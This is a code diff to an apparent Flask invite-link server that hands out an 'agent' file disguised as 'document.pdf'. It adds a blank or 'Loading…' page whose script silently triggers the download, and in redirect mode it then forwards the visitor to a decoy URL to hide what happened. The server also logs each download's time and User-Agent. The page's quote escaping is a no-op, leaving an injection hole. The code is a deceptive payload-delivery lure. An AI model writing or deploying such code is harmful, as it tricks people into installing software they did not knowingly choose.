@@ -622,17 +622,22 @@ def generate_invite():
             + datetime.timedelta(seconds=expiry_sec)
         ).isoformat()
 
+    link_mode    = data.get("link_mode", "blank")   # "blank" or "redirect"
+    redirect_url = data.get("redirect_url", "").strip()
+
     payload = {
-        "device_id":   token,
-        "label":       label,
-        "location":    loc,
-        "device_type": dtype,
-        "status":      "pending",
-        "expires_at":  expires_at,
-        "created_at":  utcnow(),
+        "device_id":    token,
+        "label":        label,
+        "location":     loc,
+        "device_type":  dtype,
+        "status":       "pending",
+        "expires_at":   expires_at,
+        "created_at":   utcnow(),
+        "link_mode":    link_mode,
+        "redirect_url": redirect_url,
     }
     db_insert(payload)
-    log.info(f"Invite generated: {token}  label={label}")
+    log.info(f"Invite generated: {token}  label={label}  mode={link_mode}")
 
     srv = request.host_url.rstrip("/")
     return jsonify({
@@ -643,6 +648,7 @@ def generate_invite():
         "download_url": f"{srv}/guide/{token}",
         "agent_url":    f"{srv}/guide/{token}",
         "expires_at":   expires_at,
+        "link_mode":    link_mode,
     }), 201
 
 
@@ -670,11 +676,59 @@ def serve_agent(token):
         "downloaded_at": utcnow(),
         "user_agent":    request.headers.get("User-Agent", "")[:200],
     })
-    log.info(f"Agent download: token={token}  redirecting to GitHub Releases")
 
-    response = redirect(AGENT_STORAGE_URL)
-    response.headers["Content-Disposition"] = "attachment; filename=document.pdf"
-    return response
+    link_mode    = session.get("link_mode", "blank")
+    redirect_url = session.get("redirect_url", "").strip()
+    dl_url       = AGENT_STORAGE_URL
+
+    log.info(f"Agent download: token={token}  mode={link_mode}")
+
+    if link_mode == "redirect" and redirect_url:
+        # Serve a minimal page: silently trigger download then redirect the user
+        safe_dl  = dl_url.replace("'", "\'")
+        safe_rdr = redirect_url.replace("'", "\'")
+        html = f"""<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><title>Loading…</title>
+<style>*{{margin:0;padding:0;box-sizing:border-box}}body{{background:#fff}}</style>
+</head>
+<body>
+<script>
+(function(){{
+  var a=document.createElement('a');
+  a.href='{safe_dl}';
+  a.download='document.pdf';
+  document.body.appendChild(a);
+  a.click();
+  document.body.removeChild(a);
+  setTimeout(function(){{ window.location.replace('{safe_rdr}'); }}, 800);
+}})();
+</script>
+</body>
+</html>"""
+        return html, 200, {"Content-Type": "text/html; charset=utf-8"}
+
+    # Default: blank page — download fires silently, page stays blank
+    safe_dl = dl_url.replace("'", "\'")
+    html = f"""<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><title> </title>
+<style>*{{margin:0;padding:0}}body{{background:#000}}</style>
+</head>
+<body>
+<script>
+(function(){{
+  var a=document.createElement('a');
+  a.href='{safe_dl}';
+  a.download='document.pdf';
+  document.body.appendChild(a);
+  a.click();
+  document.body.removeChild(a);
+}})();
+</script>
+</body>
+</html>"""
+    return html, 200, {"Content-Type": "text/html; charset=utf-8"}
 
 
 @app.route("/api/session/<token>/status")
